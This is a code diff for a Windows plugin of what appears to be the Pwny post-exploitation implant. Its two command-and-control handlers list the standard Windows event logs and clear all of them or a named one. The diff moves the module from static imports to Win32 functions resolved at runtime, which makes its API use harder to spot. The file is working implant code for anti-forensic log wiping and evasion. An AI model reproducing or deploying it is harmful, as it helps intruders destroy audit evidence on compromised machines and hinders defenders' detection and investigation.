@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -31,27 +31,44 @@
 
 #ifdef __windows__
 
-#include <pwny/tab_dll.h>
-
-#include <windows.h>
-#include <string.h>
+#include <pwny/api.h>
+#include <pwny/tlv_types.h>
 #include <pwny/c2.h>
 #include <pwny/log.h>
 
-#define EVENTLOG_BASE 23
+#include <windows.h>
+
+#define COT_PLUGIN
+#include <pwny/tab_cot.h>
+
+/* Win32 function pointer typedefs */
+typedef HANDLE (WINAPI *fn_OpenEventLogA)(LPCSTR, LPCSTR);
+typedef BOOL   (WINAPI *fn_GetNumberOfEventLogRecords)(HANDLE, PDWORD);
+typedef BOOL   (WINAPI *fn_CloseEventLog)(HANDLE);
+typedef BOOL   (WINAPI *fn_ClearEventLogA)(HANDLE, LPCSTR);
+typedef DWORD  (WINAPI *fn_GetLastError)(void);
+
+static struct {
+    fn_OpenEventLogA              pOpenEventLogA;
+    fn_GetNumberOfEventLogRecords pGetNumberOfEventLogRecords;
+    fn_CloseEventLog              pCloseEventLog;
+    fn_ClearEventLogA             pClearEventLogA;
+    fn_GetLastError               pGetLastError;
+} w;
+
 
 #define EVENTLOG_CLEAR \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       EVENTLOG_BASE, \
+                       TAB_BASE, \
                        API_CALL)
 
 #define EVENTLOG_LIST \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       EVENTLOG_BASE, \
+                       TAB_BASE, \
                        API_CALL + 1)
 
-#define TLV_TYPE_EVTLOG_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, EVENTLOG_BASE, API_TYPE)
-#define TLV_TYPE_EVTLOG_COUNT TLV_TYPE_CUSTOM(TLV_TYPE_INT, EVENTLOG_BASE, API_TYPE)
+#define TLV_TYPE_EVTLOG_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
+#define TLV_TYPE_EVTLOG_COUNT TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
 
 /* Standard Windows event log names */
 static const char *default_event_logs[] = {
@@ -74,11 +91,11 @@ static tlv_pkt_t *eventlog_list(c2_t *c2)
         HANDLE hEventLog;
         DWORD count = 0;
 
-        hEventLog = OpenEventLogA(NULL, default_event_logs[i]);
+        hEventLog = w.pOpenEventLogA(NULL, default_event_logs[i]);
         if (hEventLog != NULL)
         {
-            GetNumberOfEventLogRecords(hEventLog, &count);
-            CloseEventLog(hEventLog);
+            w.pGetNumberOfEventLogRecords(hEventLog, &count);
+            w.pCloseEventLog(hEventLog);
         }
 
         tlv_pkt_add_string(result, TLV_TYPE_EVTLOG_NAME,
@@ -102,17 +119,17 @@ static tlv_pkt_t *eventlog_clear(c2_t *c2)
 
         for (i = 0; default_event_logs[i] != NULL; i++)
         {
-            hEventLog = OpenEventLogA(NULL, default_event_logs[i]);
+            hEventLog = w.pOpenEventLogA(NULL, default_event_logs[i]);
             if (hEventLog != NULL)
             {
-                if (!ClearEventLogA(hEventLog, NULL))
+                if (!w.pClearEventLogA(hEventLog, NULL))
                 {
                     log_debug("* eventlog_clear: ClearEventLog(%s) failed (%lu)\n",
-                              default_event_logs[i], GetLastError());
+                              default_event_logs[i], w.pGetLastError());
                     any_failed = 1;
                 }
 
-                CloseEventLog(hEventLog);
+                w.pCloseEventLog(hEventLog);
             }
             else
             {
@@ -125,28 +142,34 @@ static tlv_pkt_t *eventlog_clear(c2_t *c2)
             c2->request);
     }
 
-    hEventLog = OpenEventLogA(NULL, name);
+    hEventLog = w.pOpenEventLogA(NULL, name);
     if (hEventLog == NULL)
     {
         log_debug("* eventlog_clear: OpenEventLog(%s) failed (%lu)\n",
-                  name, GetLastError());
+                  name, w.pGetLastError());
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
-    if (!ClearEventLogA(hEventLog, NULL))
+    if (!w.pClearEventLogA(hEventLog, NULL))
     {
         log_debug("* eventlog_clear: ClearEventLog(%s) failed (%lu)\n",
-                  name, GetLastError());
-        CloseEventLog(hEventLog);
+                  name, w.pGetLastError());
+        w.pCloseEventLog(hEventLog);
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
-    CloseEventLog(hEventLog);
+    w.pCloseEventLog(hEventLog);
     return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
-TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
+COT_ENTRY
 {
+    w.pOpenEventLogA = (fn_OpenEventLogA)cot_resolve("advapi32.dll", "OpenEventLogA");
+    w.pGetNumberOfEventLogRecords = (fn_GetNumberOfEventLogRecords)cot_resolve("advapi32.dll", "GetNumberOfEventLogRecords");
+    w.pCloseEventLog = (fn_CloseEventLog)cot_resolve("advapi32.dll", "CloseEventLog");
+    w.pClearEventLogA = (fn_ClearEventLogA)cot_resolve("advapi32.dll", "ClearEventLogA");
+    w.pGetLastError = (fn_GetLastError)cot_resolve("kernel32.dll", "GetLastError");
+
     api_call_register(api_calls, EVENTLOG_CLEAR, (api_t)eventlog_clear);
     api_call_register(api_calls, EVENTLOG_LIST, (api_t)eventlog_list);
 }
